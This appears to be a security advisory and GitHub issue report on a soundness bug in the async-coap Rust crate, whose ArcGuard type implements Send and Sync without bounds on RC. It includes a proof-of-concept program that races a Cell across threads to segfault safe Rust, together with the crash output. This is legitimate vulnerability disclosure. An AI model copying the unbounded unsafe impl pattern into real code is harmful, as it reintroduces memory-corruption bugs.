## Description

An issue was discovered in the async-coap crate through 2020-12-08 for Rust.

Affected versions of this crate implement Send/Sync for `ArcGuard<RC, T>` with no trait bounds on `RC`. This allows users to send `RC: !Send` to other threads and also allows users to concurrently access `Rc: !Sync` from multiple threads.

This can result in memory corruption from data race or other undefined behavior caused by sending `T: !Send` to other threads (e.g. dropping `MutexGuard<T>` in another thread that didn't lock its mutex).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

Hi there, we (Rust group [@sslab-gatech](https://github.com/sslab-gatech)) are scanning crates on crates.io for potential soundness bugs. We noticed that `async_coap::arc_guard::ArcGuard` implements `Send` and `Sync` so long as `T: Send` and `T: Sync`.

[rust-async-coap/async-coap/src/arc\_guard.rs](https://github.com/google/rust-async-coap/blob/6a7b592a23de0c9d86ca399bf40ecfbf0bff6e62/async-coap/src/arc_guard.rs#L163-L164)

[6a7b592](/google/rust-async-coap/commit/6a7b592a23de0c9d86ca399bf40ecfbf0bff6e62)

|  | unsafe impl<RC, T: Send> Send for ArcGuard<RC, T> {} |
| --- | --- |
|  | unsafe impl<RC, T: Sync> Sync for ArcGuard<RC, T> {} |

However, this should also probably be bounded by `RC: Send` and `RC: Sync`, otherwise it's possible to smuggle across non-Send types across thread boundaries. Here's a proof-of-concept that segfaults safe rust code:

```
#![forbid(unsafe_code)]

use async_coap::arc_guard::ArcGuard;

use std::{cell::Cell, sync::Arc};
use crossbeam_utils::thread;

// A simple tagged union used to demonstrate problems with data races in Cell.
#[derive(Debug, Clone, Copy)]
enum RefOrInt {
    Ref(&'static u64),
    Int(u64),
}
static SOME_INT: u64 = 123;

fn main() {
    let cell = Cell::new(RefOrInt::Ref(&SOME_INT));
    let arc = Arc::new(cell);

    let arc_guard = ArcGuard::new(arc, |_| ());
    thread::scope(|s| {
        s.spawn(|_| {
            let smuggled_arc = (&arc_guard).head();

            loop {
                // Repeatedly write Ref(&addr) and Int(0xdeadbeef) into the cell.
                smuggled_arc.set(RefOrInt::Ref(&SOME_INT));
                smuggled_arc.set(RefOrInt::Int(0xdeadbeef));
            }
        });

        loop {
            if let RefOrInt::Ref(addr) = (**arc_guard.head()).get() {
                // Hope that between the time we pattern match the object as a
                // `Ref`, it gets written to by the other thread.
                if addr as *const u64 == &SOME_INT as *const u64 { continue; }

                println!("Pointer is now: {:p}", addr);
                println!("Dereferencing addr will now segfault: {}", *addr);
            }
        }
    });
}
```

Output:

```
Pointer is now: 0xdeadbeef

Terminated with signal 11 (SIGSEGV)

```

### Description

Affected versions of this crate implement Send/Sync for `ArcGuard<RC, T>` with no trait bounds on `RC`. This allows users to send `RC: !Send` to other threads and also allows users to concurrently access `Rc: !Sync` from multiple threads.

This can result in memory corruption from data race or other undefined behavior caused by sending `T: !Send` to other threads (e.g. dropping `MutexGuard<T>` in another thread that didn't lock its mutex).
